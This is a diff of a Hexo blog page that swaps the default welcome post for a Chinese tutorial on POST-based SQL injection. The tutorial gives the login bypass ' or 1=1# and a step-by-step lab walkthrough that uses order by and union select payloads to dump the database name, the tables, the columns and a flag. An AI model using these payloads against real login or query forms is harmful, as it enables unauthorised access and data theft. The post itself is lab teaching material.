@@ -7,7 +7,7 @@
 
 
 
-<title>Hello World | Hexo</title>
+<title>POST/HEAD注入 | Hexo</title>
 
 
 
@@ -169,7 +169,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">Hello World</h1>
+            <h1 class="post-title">POST/HEAD注入</h1>
             
                 <div class="post-meta">
                     
@@ -178,7 +178,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">October 14, 2019&nbsp;&nbsp;14:19:48</a>
+                        Date: <a href="#">October 15, 2019&nbsp;&nbsp;18:07:54</a>
                         </span>
                     
                     
@@ -187,19 +187,48 @@
         </header>
 
         <div class="post-content">
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+            <h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p><strong>万能密码</strong></p>
+<p>最经典的POST注入 </p>
+<pre><code>&apos;or1=1#</code></pre><p>‘为闭合 闭合前面的单引号 否则会认为输入的是字符串</p>
+<p><em>#</em> 为注释掉后边的代码内容</p>
+<p>数据库判断</p>
+<pre><code>username=&apos;&apos; and pssword=&apos;&apos;</code></pre><p>讲万能密码插入后为</p>
+<p>username=’’ and (password=’’or 1=1 )</p>
+<p>前半句为真 后半句也为真 </p>
+<p>提示登陆成功</p>
+<p>还可以用limit排序查询    limit1,limit2…..</p>
+<p><strong>两个POST注入的关键条件</strong></p>
+<p>第一个是用户能够控制输入</p>
+<p>第二个是原本程序要执行的代码，拼接了用户输入的数据</p>
+<p><strong>POST注入的高危点：</strong></p>
+<p>登录框,查询框,各种和数据库有交互的框。</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>先闭合 </p>
+<p>可以使用’ “ ‘) “)等</p>
+<p>输入”时回显正常，<br>输入’时报错</p>
+<p>证明’闭合有效<br><img src="https://s2.ax1x.com/2019/10/16/KPh1W6.png" alt="KPh1W6.png"></p>
+<p>输入：<code>&#39; and 1=1 # )</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/16/KPhJyD.png" alt="KPhJyD.png"></p>
+<p>回显正常</p>
+<p>说明<strong>存在注入点</strong><br>并要用’)进行闭合 方能进行查询</p>
+<p><strong>order by 语句查询字段</strong></p>
+<p> ‘order by 3 #)<br>报错</p>
+<p><img src="https://s2.ax1x.com/2019/10/16/KPhBfP.png" alt="KPhBfP.png"></p>
+<p>‘order by 2 #)<br>  回显正常 说明有两个字段</p>
+<p><img src="https://s2.ax1x.com/2019/10/16/KPhy6S.png" alt="KPhy6S.png"></p>
+<p><strong>使用union 联合查询 显错点，输出点</strong></p>
+<p>构造语句</p>
+<pre><code>&apos; union select 1,2 #）</code></pre><p>爆出字段为 1，2</p>
+<p><img src="https://s2.ax1x.com/2019/10/16/KP4Pne.png" alt="KP4Pne.png"></p>
+<p><strong>爆出数据库名</strong></p>
+<pre><code>&apos; union select 1,database() #)</code></pre><p> 为security</p>
+<p><img src="https://s2.ax1x.com/2019/10/16/KP4DE9.png" alt="KP4DE9.png"></p>
+<p><strong>爆表名</strong><br>构造语句为</p>
+<pre><code>&apos; union select 1,group_concat(table_name)from information_schema.tables where table_schema=&quot;security&quot;#）</code></pre><p><img src="https://s2.ax1x.com/2019/10/16/KP47Ct.png" alt="KP47Ct.png"><br>爆出表名</p>
+<p><strong>爆字段名</strong></p>
+<pre><code>&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=“zkaq” #)</code></pre><p><img src="https://img-blog.csdnimg.cn/20190408141520240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDk3Nzc3,size_16,color_FFFFFF,t_70" alt></p>
+<p><strong>查询字段内容</strong></p>
+<pre><code>&apos; union select group_concat(flag),group_concat(zKaQ) from zkaq #)</code></pre><p><img src="https://s2.ax1x.com/2019/10/16/KP58qe.png" alt="KP58qe.png"></p>
+<p>得到FLAG</p>
 
         </div>
 
@@ -214,7 +243,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://yoursite.com/2019/10/14/hello-world/">http://yoursite.com/2019/10/14/hello-world/</a></span>
+                        <span><a href="http://yoursite.com/2019/10/15/POSTHEAD注入/">http://yoursite.com/2019/10/15/POSTHEAD注入/</a></span>
                     </p>
                 
                 
@@ -247,6 +276,8 @@
         </section>
         <section class="post-nav">
             
+            
+            <a class="next" rel="next" href="/2019/10/15/SQL显错注入/">SQL显错注入</a>
             
         </section>
 
